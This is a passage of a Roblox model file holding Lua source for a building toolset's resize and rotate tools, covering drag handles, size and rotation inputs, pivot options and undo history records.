	-- Update the GUI regularly
	coroutine.wrap( function ()
		updater_on = true;

		-- Provide a function to stop the loop
		self.Updater = function ()
			updater_on = false;
		end;

		while wait( 0.1 ) and updater_on do

			-- Make sure the tool's equipped
			if CurrentTool == self then

				-- Update the GUI if it's visible
				if self.GUI and self.GUI.Visible then
					self:updateGUI();
				end;

			end;

		end;

	end )();

end;

Tools.Resize.Listeners.Unequipped = function ()

	local self = Tools.Resize;

	-- Stop the update loop
	if self.Updater then
		self.Updater();
		self.Updater = nil;
	end;

	-- Hide the GUI
	self:hideGUI();

	-- Hide the handles
	self:hideHandles();

	-- Clear out any temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of the selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Resize.Listeners.KeyUp = function ( Key )
	local self = Tools.Resize;

	-- Provide a keyboard shortcut to the increment input
	if Key == '-' and self.GUI then
		self.GUI.IncrementOption.Increment.TextBox:CaptureFocus();
	end;
end;

Tools.Resize.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then

		local Container = Tool.Interfaces.BTResizeToolGUI:Clone();
		Container.Parent = UI;

		-- Change the axis type option when the button is clicked
		Container.DirectionsOption.Normal.Button.MouseButton1Down:connect( function ()
			self.Options.directions = "normal";
			Container.DirectionsOption.Normal.SelectedIndicator.BackgroundTransparency = 0;
			Container.DirectionsOption.Normal.Background.Image = Assets.DarkSlantedRectangle;
			Container.DirectionsOption.Both.SelectedIndicator.BackgroundTransparency = 1;
			Container.DirectionsOption.Both.Background.Image = Assets.LightSlantedRectangle;
		end );

		Container.DirectionsOption.Both.Button.MouseButton1Down:connect( function ()
			self.Options.directions = "both";
			Container.DirectionsOption.Normal.SelectedIndicator.BackgroundTransparency = 1;
			Container.DirectionsOption.Normal.Background.Image = Assets.LightSlantedRectangle;
			Container.DirectionsOption.Both.SelectedIndicator.BackgroundTransparency = 0;
			Container.DirectionsOption.Both.Background.Image = Assets.DarkSlantedRectangle;
		end );

		-- Change the increment option when the value of the textbox is updated
		Container.IncrementOption.Increment.TextBox.FocusLost:connect( function ( enter_pressed )
			self.Options.increment = tonumber( Container.IncrementOption.Increment.TextBox.Text ) or self.Options.increment;
			Container.IncrementOption.Increment.TextBox.Text = tostring( self.Options.increment );
		end );

		-- Add functionality to the size inputs
		Container.Info.SizeInfo.X.TextButton.MouseButton1Down:connect( function ()
			self.State.size_x_focused = true;
			Container.Info.SizeInfo.X.TextBox:CaptureFocus();
		end );
		Container.Info.SizeInfo.X.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.Info.SizeInfo.X.TextBox.Text );
			if potential_new then
				self:changeSize( 'x', potential_new );
			end;
			self.State.size_x_focused = false;
		end );
		Container.Info.SizeInfo.Y.TextButton.MouseButton1Down:connect( function ()
			self.State.size_y_focused = true;
			Container.Info.SizeInfo.Y.TextBox:CaptureFocus();
		end );
		Container.Info.SizeInfo.Y.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.Info.SizeInfo.Y.TextBox.Text );
			if potential_new then
				self:changeSize( 'y', potential_new );
			end;
			self.State.size_y_focused = false;
		end );
		Container.Info.SizeInfo.Z.TextButton.MouseButton1Down:connect( function ()
			self.State.size_z_focused = true;
			Container.Info.SizeInfo.Z.TextBox:CaptureFocus();
		end );
		Container.Info.SizeInfo.Z.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.Info.SizeInfo.Z.TextBox.Text );
			if potential_new then
				self:changeSize( 'z', potential_new );
			end;
			self.State.size_z_focused = false;
		end );

		self.GUI = Container;
	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Resize.startHistoryRecord = function ( self )

	if self.State.HistoryRecord then
		self.State.HistoryRecord = nil;
	end;

	-- Create a history record
	self.State.HistoryRecord = {
		targets = _cloneTable( Selection.Items );
		initial_positions = {};
		terminal_positions = {};
		initial_sizes = {};
		terminal_sizes = {};
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.Size = self.initial_sizes[Target];
					Target.CFrame = self.initial_positions[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.Size = self.terminal_sizes[Target];
					Target.CFrame = self.terminal_positions[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
	};
	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.initial_sizes[Item] = Item.Size;
			self.State.HistoryRecord.initial_positions[Item] = Item.CFrame;
		end;
	end;

end;

Tools.Resize.finishHistoryRecord = function ( self )

	if not self.State.HistoryRecord then
		return;
	end;

	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.terminal_sizes[Item] = Item.Size;
			self.State.HistoryRecord.terminal_positions[Item] = Item.CFrame;
		end;
	end;
	History:add( self.State.HistoryRecord );
	self.State.HistoryRecord = nil;

end;

Tools.Resize.changeSize = function ( self, component, new_value )

	self:startHistoryRecord();

	-- Change the size of each item selected
	for _, Item in pairs( Selection.Items ) do
		local OldCFrame = Item.CFrame;
		-- Make the item be able to be freely resized
		if ( pcall( function () local test = Item.FormFactor; end ) ) then
			Item.FormFactor = Enum.FormFactor.Custom;
		end;
		Item.Size = Vector3.new(
			component == 'x' and new_value or Item.Size.x,
			component == 'y' and new_value or Item.Size.y,
			component == 'z' and new_value or Item.Size.z
		);
		Item.CFrame = OldCFrame;
	end;

	self:finishHistoryRecord();

end;

Tools.Resize.updateGUI = function ( self )

	-- Make sure the GUI exists
	if not self.GUI then
		return;
	end;

	local GUI = self.GUI;

	if #Selection.Items > 0 then

		-- Look for identical numbers in each axis
		local size_x, size_y, size_z =  nil, nil, nil;
		for item_index, Item in pairs( Selection.Items ) do

			-- Set the first values for the first item
			if item_index == 1 then
				size_x, size_y, size_z = _round( Item.Size.x, 2 ), _round( Item.Size.y, 2 ), _round( Item.Size.z, 2 );

			-- Otherwise, compare them and set them to `nil` if they're not identical
			else
				if size_x ~= _round( Item.Size.x, 2 ) then
					size_x = nil;
				end;
				if size_y ~= _round( Item.Size.y, 2 ) then
					size_y = nil;
				end;
				if size_z ~= _round( Item.Size.z, 2 ) then
					size_z = nil;
				end;
			end;

		end;

		-- Update the size info on the GUI
		if not self.State.size_x_focused then
			GUI.Info.SizeInfo.X.TextBox.Text = size_x and tostring( size_x ) or "*";
		end;
		if not self.State.size_y_focused then
			GUI.Info.SizeInfo.Y.TextBox.Text = size_y and tostring( size_y ) or "*";
		end;
		if not self.State.size_z_focused then
			GUI.Info.SizeInfo.Z.TextBox.Text = size_z and tostring( size_z ) or "*";
		end;

		GUI.Info.Visible = true;
	else
		GUI.Info.Visible = false;
	end;

	if self.State.length_resized then
		GUI.Changes.Text.Text = "resized " .. tostring( self.State.length_resized ) .. " studs";
		GUI.Changes.Position = GUI.Info.Visible and UDim2.new( 0, 5, 0, 165 ) or UDim2.new( 0, 5, 0, 100 );
		GUI.Changes.Visible = true;
	else
		GUI.Changes.Text.Text = "";
		GUI.Changes.Visible = false;
	end;

end;

Tools.Resize.hideGUI = function ( self )

	-- Hide the GUI if it exists
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Resize.showHandles = function ( self, Part )

	-- Create the handles if they don't exist yet
	if not self.Handles then

		-- Create the object
		self.Handles = RbxUtility.Create "Handles" {
			Name = "BTResizeHandles";
			Style = Enum.HandlesStyle.Resize;
			Color = self.Color;
			Parent = GUIContainer;
		};

		-- Add functionality to the handles
		self.Handles.MouseButton1Down:connect( function ()

			-- Prevent the platform from thinking we're selecting
			override_selection = true;
			self.State.resizing = true;

			-- Clear the change stats
			self.State.length_resized = 0;

			self:startHistoryRecord();

			-- Do a few things to the selection before manipulating it
			for _, Item in pairs( Selection.Items ) do

				-- Keep a copy of the state of each item
				self.State.PreResize[Item] = Item:Clone();

				-- Make the item be able to be freely resized
				if ( pcall( function () local test = Item.FormFactor; end ) ) then
					Item.FormFactor = Enum.FormFactor.Custom;
				end;

				-- Anchor each item
				Item.Anchored = true;

			end;

			-- Return stuff to normal once the mouse button is released
			self.Connections.HandleReleaseListener = Mouse.Button1Up:connect( function ()

				-- Prevent the platform from thinking we're selecting
				override_selection = true;
				self.State.resizing = false;

				-- Stop this connection from firing again
				if self.Connections.HandleReleaseListener then
					self.Connections.HandleReleaseListener:disconnect();
					self.Connections.HandleReleaseListener = nil;
				end;

				self:finishHistoryRecord();

				-- Restore properties that may have been changed temporarily
				-- from the pre-resize state copies
				for Item, PreviousItemState in pairs( self.State.PreResize ) do
					Item.Anchored = PreviousItemState.Anchored;
					self.State.PreResize[Item] = nil;
					Item:MakeJoints();
				end;

			end );

		end );

		self.Handles.MouseDrag:connect( function ( face, drag_distance )

			-- Calculate which multiple of the increment to use based on the current drag distance's
			-- proximity to their nearest upper and lower multiples

			local difference = drag_distance % self.Options.increment;

			local lower_degree = drag_distance - difference;
			local upper_degree = drag_distance - difference + self.Options.increment;

			local lower_degree_proximity = math.abs( drag_distance - lower_degree );
			local upper_degree_proximity = math.abs( drag_distance - upper_degree );

			if lower_degree_proximity <= upper_degree_proximity then
				drag_distance = lower_degree;
			else
				drag_distance = upper_degree;
			end;

			local increase = drag_distance;

			-- Log the distance that the handle was dragged
			self.State.previous_distance = drag_distance;

			-- Note the length by which the selection will be enlarged
			if self.Options.directions == "both" then
				increase = drag_distance * 2;
			end;
			self.State.length_resized = increase;

			-- Go through the selection and make changes to it
			for _, Item in pairs( Selection.Items ) do

				-- Keep a copy of `Item` in case we need to revert anything
				local PreviousItemState = Item:Clone();

				-- Break any of `Item`'s joints so it can move freely
				Item:BreakJoints();

				-- Position and resize `Item` according to the options and the handle that was used

				if face == Enum.NormalId.Top then

					-- Calculate the appropriate increment to the size based on the shape of `Item`
					local SizeIncrease;
					if ( pcall( function () local test = Item.Shape; end ) ) and ( Item.Shape == Enum.PartType.Ball or Item.Shape == Enum.PartType.Cylinder ) then
						SizeIncrease = Vector3.new( increase, increase, increase );
					elseif not ( pcall( function () local test = Item.Shape; end ) ) or ( Item.Shape and Item.Shape == Enum.PartType.Block ) then
						SizeIncrease = Vector3.new( 0, increase, 0 );
					end;

					Item.Size = self.State.PreResize[Item].Size + SizeIncrease;
					if Item.Size == self.State.PreResize[Item].Size + SizeIncrease then
						Item.CFrame = ( self.Options.directions == "normal" and self.State.PreResize[Item].CFrame:toWorldSpace( CFrame.new( 0, increase / 2, 0 ) ) )
									  or ( self.Options.directions == "both" and self.State.PreResize[Item].CFrame );
					-- If the resizing was not possible, revert `Item`'s state
					else
						Item.Size = PreviousItemState.Size;
						Item.CFrame = PreviousItemState.CFrame;
					end;

				elseif face == Enum.NormalId.Bottom then

					-- Calculate the appropriate increment to the size based on the shape of `Item`
					local SizeIncrease;
					if ( pcall( function () local test = Item.Shape; end ) ) and ( Item.Shape == Enum.PartType.Ball or Item.Shape == Enum.PartType.Cylinder ) then
						SizeIncrease = Vector3.new( increase, increase, increase );
					elseif not ( pcall( function () local test = Item.Shape; end ) ) or ( Item.Shape and Item.Shape == Enum.PartType.Block ) then
						SizeIncrease = Vector3.new( 0, increase, 0 );
					end;

					Item.Size = self.State.PreResize[Item].Size + SizeIncrease;
					if Item.Size == self.State.PreResize[Item].Size + SizeIncrease then
						Item.CFrame = ( self.Options.directions == "normal" and self.State.PreResize[Item].CFrame:toWorldSpace( CFrame.new( 0, -increase / 2, 0 ) ) )
									  or ( self.Options.directions == "both" and self.State.PreResize[Item].CFrame );
					-- If the resizing was not possible, revert `Item`'s state
					else
						Item.Size = PreviousItemState.Size;
						Item.CFrame = PreviousItemState.CFrame;
					end;

				elseif face == Enum.NormalId.Front then

					-- Calculate the appropriate increment to the size based on the shape of `Item`
					local SizeIncrease;
					if ( pcall( function () local test = Item.Shape; end ) ) and ( Item.Shape == Enum.PartType.Ball or Item.Shape == Enum.PartType.Cylinder ) then
						SizeIncrease = Vector3.new( increase, increase, increase );
					elseif not ( pcall( function () local test = Item.Shape; end ) ) or ( Item.Shape and Item.Shape == Enum.PartType.Block ) then
						SizeIncrease = Vector3.new( 0, 0, increase );
					end;

					Item.Size = self.State.PreResize[Item].Size + SizeIncrease;
					if Item.Size == self.State.PreResize[Item].Size + SizeIncrease then
						Item.CFrame = ( self.Options.directions == "normal" and self.State.PreResize[Item].CFrame:toWorldSpace( CFrame.new( 0, 0, -increase / 2 ) ) )
									  or ( self.Options.directions == "both" and self.State.PreResize[Item].CFrame );
					-- If the resizing was not possible, revert `Item`'s state
					else
						Item.Size = PreviousItemState.Size;
						Item.CFrame = PreviousItemState.CFrame;
					end;

				elseif face == Enum.NormalId.Back then

					-- Calculate the appropriate increment to the size based on the shape of `Item`
					local SizeIncrease;
					if ( pcall( function () local test = Item.Shape; end ) ) and ( Item.Shape == Enum.PartType.Ball or Item.Shape == Enum.PartType.Cylinder ) then
						SizeIncrease = Vector3.new( increase, increase, increase );
					elseif not ( pcall( function () local test = Item.Shape; end ) ) or ( Item.Shape and Item.Shape == Enum.PartType.Block ) then
						SizeIncrease = Vector3.new( 0, 0, increase );
					end;

					Item.Size = self.State.PreResize[Item].Size + SizeIncrease;
					if Item.Size == self.State.PreResize[Item].Size + SizeIncrease then
						Item.CFrame = ( self.Options.directions == "normal" and self.State.PreResize[Item].CFrame:toWorldSpace( CFrame.new( 0, 0, increase / 2 ) ) )
									  or ( self.Options.directions == "both" and self.State.PreResize[Item].CFrame );
					-- If the resizing was not possible, revert `Item`'s state
					else
						Item.Size = PreviousItemState.Size;
						Item.CFrame = PreviousItemState.CFrame;
					end;

				elseif face == Enum.NormalId.Left then

					-- Calculate the appropriate increment to the size based on the shape of `Item`
					local SizeIncrease;
					if ( pcall( function () local test = Item.Shape; end ) ) and ( Item.Shape == Enum.PartType.Ball or Item.Shape == Enum.PartType.Cylinder ) then
						SizeIncrease = Vector3.new( increase, increase, increase );
					elseif not ( pcall( function () local test = Item.Shape; end ) ) or ( Item.Shape and Item.Shape == Enum.PartType.Block ) then
						SizeIncrease = Vector3.new( increase, 0, 0 );
					end;

					Item.Size = self.State.PreResize[Item].Size + SizeIncrease;
					if Item.Size == self.State.PreResize[Item].Size + SizeIncrease then
						Item.CFrame = ( self.Options.directions == "normal" and self.State.PreResize[Item].CFrame:toWorldSpace( CFrame.new( -increase / 2, 0, 0 ) ) )
									  or ( self.Options.directions == "both" and self.State.PreResize[Item].CFrame );
					-- If the resizing was not possible, revert `Item`'s state
					else
						Item.Size = PreviousItemState.Size;
						Item.CFrame = PreviousItemState.CFrame;
					end;

				elseif face == Enum.NormalId.Right then

					-- Calculate the appropriate increment to the size based on the shape of `Item`
					local SizeIncrease;
					if ( pcall( function () local test = Item.Shape; end ) ) and ( Item.Shape == Enum.PartType.Ball or Item.Shape == Enum.PartType.Cylinder ) then
						SizeIncrease = Vector3.new( increase, increase, increase );
					elseif not ( pcall( function () local test = Item.Shape; end ) ) or ( Item.Shape and Item.Shape == Enum.PartType.Block ) then
						SizeIncrease = Vector3.new( increase, 0, 0 );
					end;

					Item.Size = self.State.PreResize[Item].Size + SizeIncrease;
					if Item.Size == self.State.PreResize[Item].Size + SizeIncrease then
						Item.CFrame = ( self.Options.directions == "normal" and self.State.PreResize[Item].CFrame:toWorldSpace( CFrame.new( increase / 2, 0, 0 ) ) )
									  or ( self.Options.directions == "both" and self.State.PreResize[Item].CFrame );
					-- If the resizing was not possible, revert `Item`'s state
					else
						Item.Size = PreviousItemState.Size;
						Item.CFrame = PreviousItemState.CFrame;
					end;
				end;

				-- Make joints with surrounding parts again once the resizing is done
				Item:MakeJoints();

			end;

		end );

	end;

	-- Stop listening for the existence of the previous adornee (if any)
	if self.Connections.AdorneeExistenceListener then
		self.Connections.AdorneeExistenceListener:disconnect();
		self.Connections.AdorneeExistenceListener = nil;
	end;

	-- Attach the handles to `Part`
	self.Handles.Adornee = Part;

	-- Make sure to hide the handles if `Part` suddenly stops existing
	self.Connections.AdorneeExistenceListener = Part.AncestryChanged:connect( function ( Object, NewParent )

		-- Make sure this change in parent applies directly to `Part`
		if Object ~= Part then
			return;
		end;

		-- Show the handles according to the existence of the part
		if NewParent == nil then
			self:hideHandles();
		else
			self:showHandles( Part );
		end;

	end );

end;

Tools.Resize.hideHandles = function ( self )

	-- Hide the handles if they exist
	if self.Handles then
		self.Handles.Adornee = nil;
	end;

end;

Tools.Resize.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBX63CC7A830BA942CCBF67A3B882D46389">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTRotateTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Rotate tool
------------------------------------------

-- Create the tool
Tools.Rotate = {};

-- Create structures to hold data that the tool needs
Tools.Rotate.Connections = {};

Tools.Rotate.Options = {
	["increment"] = 15;
	["pivot"] = "center"
};

Tools.Rotate.State = {
	["PreRotation"] = {};
	["rotating"] = false;
	["previous_distance"] = 0;
	["degrees_rotated"] = 0;
	["rotation_size"] = 0;
};

Tools.Rotate.Listeners = {};

-- Define the color of the tool
Tools.Rotate.Color = BrickColor.new( "Bright green" );

-- Start adding functionality to the tool
Tools.Rotate.Listeners.Equipped = function ()

	local self = Tools.Rotate;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Create the boundingbox if it doesn't already exist
	if not self.BoundingBox then
		self.BoundingBox = RbxUtility.Create "Part" {
			Name = "BTBoundingBox";
			CanCollide = false;
			Transparency = 1;
			Anchored = true;
		};
	end;
	Mouse.TargetFilter = self.BoundingBox;

	-- Update the pivot option
	self:changePivot( self.Options.pivot );

	-- Oh, and update the boundingbox and the GUI regularly
	coroutine.wrap( function ()
		updater_on = true;

		-- Provide a function to stop the loop
		self.Updater = function ()
			updater_on = false;
		end;

		while wait( 0.1 ) and updater_on do

			-- Make sure the tool's equipped
			if CurrentTool == self then

				-- Update the GUI if it's visible
				if self.GUI and self.GUI.Visible then
					self:updateGUI();
				end;

				-- Update the boundingbox if it's visible
				if self.Options.pivot == "center" then
					self:updateBoundingBox();
				end;

			end;

		end;

	end )();

	-- Also enable the ability to select an edge as a pivot
	SelectEdge:start( function ( EdgeMarker )
		self:changePivot( "last" );
		self.Options.PivotPoint = EdgeMarker.CFrame;
		self.Connections.EdgeSelectionRemover = Selection.Changed:connect( function ()
			self.Options.PivotPoint = nil;
			if self.Connections.EdgeSelectionRemover then
				self.Connections.EdgeSelectionRemover:disconnect();
				self.Connections.EdgeSelectionRemover = nil;
			end;
		end );
		self:showHandles( EdgeMarker );
	end );

end;

Tools.Rotate.Listeners.Unequipped = function ()

	local self = Tools.Rotate;

	-- Stop the update loop
	if self.Updater then
		self.Updater();
		self.Updater = nil;
	end;

	-- Disable the ability to select edges
	SelectEdge:stop();
	if self.Options.PivotPoint then
		self.Options.PivotPoint = nil;
	end;

	-- Hide the GUI
	self:hideGUI();

	-- Hide the handles
	self:hideHandles();

	-- Clear out any temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of the selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Rotate.Listeners.Button1Down = function ()

	local self = Tools.Rotate;

	if not self.State.rotating and self.Options.PivotPoint then
		self.Options.PivotPoint = nil;
	end;

end;

Tools.Rotate.Listeners.KeyUp = function ( Key )
	local self = Tools.Rotate;

	-- Provide a keyboard shortcut to the increment input
	if Key == '-' and self.GUI then
		self.GUI.IncrementOption.Increment.TextBox:CaptureFocus();
	end;
end;

Tools.Rotate.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then

		local Container = Tool.Interfaces.BTRotateToolGUI:Clone();
		Container.Parent = UI;

		-- Change the pivot type option when the button is clicked
		Container.PivotOption.Center.Button.MouseButton1Down:connect( function ()
			self:changePivot( "center" );
		end );

		Container.PivotOption.Local.Button.MouseButton1Down:connect( function ()
			self:changePivot( "local" );
		end );

		Container.PivotOption.Last.Button.MouseButton1Down:connect( function ()
			self:changePivot( "last" );
		end );

		-- Change the increment option when the value of the textbox is updated
		Container.IncrementOption.Increment.TextBox.FocusLost:connect( function ( enter_pressed )
			self.Options.increment = tonumber( Container.IncrementOption.Increment.TextBox.Text ) or self.Options.increment;
			Container.IncrementOption.Increment.TextBox.Text = tostring( self.Options.increment );
		end );

		-- Add functionality to the rotation inputs
		Container.Info.RotationInfo.X.TextButton.MouseButton1Down:connect( function ()
			self.State.rot_x_focused = true;
			Container.Info.RotationInfo.X.TextBox:CaptureFocus();
		end );
		Container.Info.RotationInfo.X.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.Info.RotationInfo.X.TextBox.Text );
			if potential_new then
				self:changeRotation( 'x', math.rad( potential_new ) );
			end;
			self.State.rot_x_focused = false;
		end );
		Container.Info.RotationInfo.Y.TextButton.MouseButton1Down:connect( function ()
			self.State.rot_y_focused = true;
			Container.Info.RotationInfo.Y.TextBox:CaptureFocus();
		end );
		Container.Info.RotationInfo.Y.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.Info.RotationInfo.Y.TextBox.Text );
			if potential_new then
				self:changeRotation( 'y', math.rad( potential_new ) );
			end;
			self.State.rot_y_focused = false;
		end );
		Container.Info.RotationInfo.Z.TextButton.MouseButton1Down:connect( function ()
			self.State.rot_z_focused = true;
			Container.Info.RotationInfo.Z.TextBox:CaptureFocus();
		end );
		Container.Info.RotationInfo.Z.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.Info.RotationInfo.Z.TextBox.Text );
			if potential_new then
				self:changeRotation( 'z', math.rad( potential_new ) );
			end;
			self.State.rot_z_focused = false;
		end );

		self.GUI = Container;
	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Rotate.startHistoryRecord = function ( self )

	if self.State.HistoryRecord then
		self.State.HistoryRecord = nil;
	end;

	-- Create a history record
	self.State.HistoryRecord = {
		targets = _cloneTable( Selection.Items );
		initial_cframes = {};
		terminal_cframes = {};
		unapply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.CFrame = self.initial_cframes[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Target in pairs( self.targets ) do
				if Target then
					Target.CFrame = self.terminal_cframes[Target];
					Target:MakeJoints();
					Selection:add( Target );
				end;
			end;
		end;
	};
	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.initial_cframes[Item] = Item.CFrame;
		end;
	end;

end;

Tools.Rotate.finishHistoryRecord = function ( self )

	if not self.State.HistoryRecord then
		return;
	end;

	for _, Item in pairs( self.State.HistoryRecord.targets ) do
		if Item then
			self.State.HistoryRecord.terminal_cframes[Item] = Item.CFrame;
		end;
	end;
	History:add( self.State.HistoryRecord );
	self.State.HistoryRecord = nil;

end;

Tools.Rotate.changeRotation = function ( self, component, new_value )

	self:startHistoryRecord();

	-- Change the rotation of each item selected
	for _, Item in pairs( Selection.Items ) do
		local old_x_rot, old_y_rot, old_z_rot = Item.CFrame:toEulerAnglesXYZ();
		Item.CFrame = CFrame.new( Item.Position ) * CFrame.Angles(
			component == 'x' and new_value or old_x_rot,
			component == 'y' and new_value or old_y_rot,
			component == 'z' and new_value or old_z_rot
		);
	end;

	self:finishHistoryRecord();

end;

Tools.Rotate.updateGUI = function ( self )

	-- Make sure the GUI exists
	if not self.GUI then
		return;
	end;

	local GUI = self.GUI;

	if #Selection.Items > 0 then

		-- Look for identical numbers in each axis
		local rot_x, rot_y, rot_z = nil, nil, nil;
		for item_index, Item in pairs( Selection.Items ) do

			local item_rot_x, item_rot_y, item_rot_z = Item.CFrame:toEulerAnglesXYZ();

			-- Set the first values for the first item
			if item_index == 1 then
				rot_x, rot_y, rot_z = _round( math.deg( item_rot_x ), 2 ), _round( math.deg( item_rot_y ), 2 ), _round( math.deg( item_rot_z ), 2 );

			-- Otherwise, compare them and set them to `nil` if they're not identical
			else
				if rot_x ~= _round( math.deg( item_rot_x ), 2 ) then
					rot_x = nil;
				end;
				if rot_y ~= _round( math.deg( item_rot_y ), 2 ) then
					rot_y = nil;
				end;
				if rot_z ~= _round( math.deg( item_rot_z ), 2 ) then
					rot_z = nil;
				end;
			end;

		end;

		-- Update the size info on the GUI
		if not self.State.rot_x_focused then
			GUI.Info.RotationInfo.X.TextBox.Text = rot_x and tostring( rot_x ) or "*";
		end;
		if not self.State.rot_y_focused then
			GUI.Info.RotationInfo.Y.TextBox.Text = rot_y and tostring( rot_y ) or "*";
		end;
		if not self.State.rot_z_focused then
			GUI.Info.RotationInfo.Z.TextBox.Text = rot_z and tostring( rot_z ) or "*";
		end;

		GUI.Info.Visible = true;
	else
		GUI.Info.Visible = false;
	end;

	if self.State.degrees_rotated then
		GUI.Changes.Text.Text = "rotated " .. tostring( self.State.degrees_rotated ) .. " degrees";
		GUI.Changes.Position = GUI.Info.Visible and UDim2.new( 0, 5, 0, 165 ) or UDim2.new( 0, 5, 0, 100 );
		GUI.Changes.Visible = true;
	else
		GUI.Changes.Text.Text = "";
		GUI.Changes.Visible = false;
	end;

end;

Tools.Rotate.hideGUI = function ( self )

	-- Hide the GUI if it exists
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Rotate.updateBoundingBox = function ( self )

	if #Selection.Items > 0 then
		local SelectionSize, SelectionPosition = _getCollectionInfo( Selection.Items );
		self.BoundingBox.Size = SelectionSize;
		self.BoundingBox.CFrame = SelectionPosition;
		self:showHandles( self.BoundingBox );

	else
		self:hideHandles();
	end;

end;

Tools.Rotate.changePivot = function ( self, new_pivot )

	-- Have a quick reference to the GUI (if any)
	local PivotOptionGUI = self.GUI and self.GUI.PivotOption or nil;

	-- Disconnect any handle-related listeners that are specific to a certain pivot option
	if self.Connections.HandleFocusChangeListener then
		self.Connections.HandleFocusChangeListener:disconnect();
		self.Connections.HandleFocusChangeListener = nil;
	end;

	if self.Connections.HandleSelectionChangeListener then
		self.Connections.HandleSelectionChangeListener:disconnect();
		self.Connections.HandleSelectionChangeListener = nil;
	end;

	-- Remove any temporary edge selection
	if self.Options.PivotPoint then
		self.Options.PivotPoint = nil;
	end;

	if new_pivot == "center" then

		-- Update the options
		self.Options.pivot = "center";

		-- Focus the handles on the boundingbox
		self:showHandles( self.BoundingBox );

		-- Update the GUI's option panel
		if self.GUI then
			PivotOptionGUI.Center.SelectedIndicator.BackgroundTransparency = 0;
			PivotOptionGUI.Center.Background.Image = Assets.DarkSlantedRectangle;
			PivotOptionGUI.Local.SelectedIndicator.BackgroundTransparency = 1;
			PivotOptionGUI.Local.Background.Image = Assets.LightSlantedRectangle;
			PivotOptionGUI.Last.SelectedIndicator.BackgroundTransparency = 1;
			PivotOptionGUI.Last.Background.Image = Assets.LightSlantedRectangle;
		end;

	end;

	if new_pivot == "local" then

		-- Update the options
		self.Options.pivot = "local";

		-- Always have the handles on the most recent addition to the selection
		self.Connections.HandleSelectionChangeListener = Selection.Changed:connect( function ()

			-- Clear out any previous adornee
			self:hideHandles();

			-- If there /is/ a last item in the selection, attach the handles to it
			if Selection.Last then
				self:showHandles( Selection.Last );
			end;

		end );

		-- Switch the adornee of the handles if the second mouse button is pressed
		self.Connections.HandleFocusChangeListener = Mouse.Button2Up:connect( function ()

			-- Make sure the platform doesn't think we're selecting
			override_selection = true;

			-- If the target is in the selection, make it the new adornee
			if Selection:find( Mouse.Target ) then
				Selection:focus( Mouse.Target );
				self:showHandles( Mouse.Target );
			end;

		end );

		-- Finally, attach the handles to the last item added to the selection (if any)
		if Selection.Last then
			self:showHandles( Selection.Last );
		end;

		-- Update the GUI's option panel
		if self.GUI then
			PivotOptionGUI.Center.SelectedIndicator.BackgroundTransparency = 1;
			PivotOptionGUI.Center.Background.Image = Assets.LightSlantedRectangle;
			PivotOptionGUI.Local.SelectedIndicator.BackgroundTransparency = 0;
			PivotOptionGUI.Local.Background.Image = Assets.DarkSlantedRectangle;
			PivotOptionGUI.Last.SelectedIndicator.BackgroundTransparency = 1;
			PivotOptionGUI.Last.Background.Image = Assets.LightSlantedRectangle;
		end;

	end;

	if new_pivot == "last" then

		-- Update the options
		self.Options.pivot = "last";

		-- Always have the handles on the most recent addition to the selection
		self.Connections.HandleSelectionChangeListener = Selection.Changed:connect( function ()

			-- Clear out any previous adornee
			if not self.Options.PivotPoint then
				self:hideHandles();
			end;

			-- If there /is/ a last item in the selection, attach the handles to it
			if Selection.Last and not self.Options.PivotPoint then
				self:showHandles( Selection.Last );
			end;

		end );

		-- Switch the adornee of the handles if the second mouse button is pressed
		self.Connections.HandleFocusChangeListener = Mouse.Button2Up:connect( function ()

			-- Make sure the platform doesn't think we're selecting
			override_selection = true;

			-- If the target is in the selection, make it the new adornee
			if Selection:find( Mouse.Target ) then
				Selection:focus( Mouse.Target );
